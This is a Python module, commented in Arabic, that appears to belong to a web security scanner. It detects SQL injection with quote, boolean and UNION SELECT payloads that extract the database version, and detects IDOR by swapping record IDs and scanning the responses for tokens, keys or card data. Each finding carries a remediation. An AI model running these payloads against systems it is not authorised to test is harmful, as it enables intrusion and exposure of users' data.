# -*- coding: utf-8 -*-
"""
الوحدة — سحب البيانات (Data Extraction) — كشف + إثبات محدود
============================================================
تكشف المسارات التي تسمح بسحب بيانات، وتثبتها بعيّنة واحدة (لا سحب جماعي):

  - SQL Injection:
      * error-based  (حقن اقتباس → توقيع خطأ قاعدة بيانات)
      * boolean-based (AND 1=1 مقابل AND 1=2 → فرق استجابة)
      * إثبات محدود: محاولة استخراج قيمة واحدة (إصدار قاعدة البيانات) عبر UNION.
  - IDOR: تغيير معرّف رقمي → الوصول لسجل مستخدم آخر (مثال واحد كإثبات).

يتطلب --active (يرسل حمولات فحص غير مدمّرة). الهدف: تثبت الثغرة لتسدّها،
وليس تفريغ قاعدة البيانات.
"""

import re
import uuid

SQL_ERRORS = re.compile(
    r"(SQL syntax|sqlite3\.|psycopg2|mysqli?_|ORA-\d{5}|SQLSTATE|"
    r"unclosed quotation|unrecognized token|no such column|"
    r"near \".*\":|syntax error|OperationalError|ProgrammingError|"
    r"quoted string not properly terminated)", re.I)
VERSION_RE = re.compile(r"\b(\d+\.\d+\.\d+)\b")

# أسماء بارامترات شائعة للحقن والاختبار
PARAMS = ["q", "id", "search", "user", "name", "q", "page", "cat"]
# حمولات كشف (غير مدمّرة)
PROBE_QUOTE = "'"
BOOL_TRUE = "1' AND '1'='1"
BOOL_FALSE = "1' AND '1'='2"


def _finding(title, severity, endpoint, evidence, owasp, fix):
    return {
        "id": "FIND-" + uuid.uuid4().hex[:6],
        "title": title, "severity": severity, "endpoint": endpoint,
        "evidence": (str(evidence) or "")[:400], "owasp": owasp, "remediation": fix,
    }


def _with_param(ep, param, value):
    sep = "&" if "?" in ep else "?"
    return f"{ep}{sep}{param}={value}"


def _body(r):
    return getattr(r, "_body_sample", "") or ""


def _sqli_checks(session, ep):
    findings = []
    for param in set(PARAMS):
        # 1) error-based
        r = session.get(_with_param(ep, param, "zzz" + PROBE_QUOTE))
        body = _body(r)
        if SQL_ERRORS.search(body):
            findings.append(_finding(
                "حقن SQL (error-based) — يسمح بقراءة قاعدة البيانات", "حرجة",
                _with_param(ep, param, "'"),
                "توقيع خطأ SQL: " + (SQL_ERRORS.search(body).group(0)),
                "A03: Injection",
                "استخدم استعلامات مُعاملة (parameterized) حصراً وتحقّق من المدخلات."))
            # إثبات محدود: محاولة استخراج قيمة واحدة فقط (إصدار القاعدة)
            poc = _extract_version_poc(session, ep, param)
            if poc:
                findings.append(_finding(
                    "إثبات سحب بيانات عبر SQLi (قيمة واحدة)", "حرجة",
                    _with_param(ep, param, "<union payload>"),
                    "تم استخراج قيمة إثباتية (إصدار القاعدة): " + poc,
                    "A03: Injection",
                    "نفس الإصلاح أعلاه — هذه عيّنة إثبات فقط، لا سحب كامل."))
            break  # بارامتر واحد مثبت يكفي

        # 2) boolean-based
        rt = session.get(_with_param(ep, param, BOOL_TRUE))
        rf = session.get(_with_param(ep, param, BOOL_FALSE))
        lt, lf = len(_body(rt)), len(_body(rf))
        if lt and abs(lt - lf) > max(40, int(0.1 * lt)):
            findings.append(_finding(
                "حقن SQL (boolean-based) — يسمح باستنتاج البيانات", "حرجة",
                _with_param(ep, param, "1' AND '1'='1"),
                f"فرق استجابة بين TRUE({lt}) و FALSE({lf}) بايت — حقن منطقي مؤكّد.",
                "A03: Injection",
                "استعلامات مُعاملة + تحقّق صارم من المدخلات."))
            break
    return findings


def _extract_version_poc(session, ep, param):
    """إثبات محدود: استخراج إصدار القاعدة فقط عبر UNION (3 احتمالات أعمدة)."""
    markers = ["sqlite_version()", "version()", "@@version"]
    for ncol in (1, 2, 3, 4):
        for fn in markers:
            cols = ",".join([fn] + ["NULL"] * (ncol - 1))
            payload = f"zzz' UNION SELECT {cols}-- -"
            r = session.get(_with_param(ep, param, payload.replace(" ", "%20")))
            body = _body(r)
            m = VERSION_RE.search(body)
            if m:
                return m.group(1)
    return None


def _idor_checks(session, ep):
    findings = []
    # نقاط فيها معرّف رقمي قابل للتبديل
    if not re.search(r"(id|user|account|uid|num)=\d+|/\d+(/|$)", ep, re.I):
        # جرّب إضافة id=1 إن لم يكن
        ep = _with_param(ep, "id", "1") if "?" not in ep else ep
    m = re.search(r"((?:id|user|account|uid|num)=)(\d+)", ep, re.I)
    if not m:
        return findings
    base_n = int(m.group(2))
    def swap(n): return ep[:m.start(2)] + str(n) + ep[m.end(2):]
    r1 = session.get(swap(base_n))
    r2 = session.get(swap(base_n + 1))
    b1, b2 = _body(r1), _body(r2)
    ok1 = getattr(r1, "status_code", 0) == 200 and len(b1) > 20
    ok2 = getattr(r2, "status_code", 0) == 200 and len(b2) > 20
    # سجلان مختلفان يمكن الوصول لهما بتبديل الرقم = IDOR
    if ok1 and ok2 and b1 != b2 and re.search(
            r"(api|key|card|credit|token|secret|email|phone|بطاقة|مفتاح|خاص)", b1 + b2, re.I):
        findings.append(_finding(
            "IDOR — الوصول لسجلات مستخدمين آخرين بتبديل المعرّف", "عالية",
            swap(base_n + 1),
            f"المعرّفان {base_n} و {base_n+1} يرجّعان سجلين مختلفين ببيانات حساسة بلا تحقق صلاحية.",
            "A01: Broken Access Control",
            "تحقّق أن صاحب الجلسة يملك السجل المطلوب (object-level authorization)."))
    return findings


def run(session, discovered, allow_active=False):
    if not allow_active:
        return []   # الفحوص الفعّالة تحتاج --active
    findings = []
    for url, info in discovered.items():
        for ep in info.get("all_endpoints", []):
            findings += _sqli_checks(session, ep)
            findings += _idor_checks(session, ep)
    # إزالة التكرار
    seen, uniq = set(), []
    for f in findings:
        key = (f["title"], f["endpoint"])
        if key not in seen:
            seen.add(key); uniq.append(f)
    return uniq
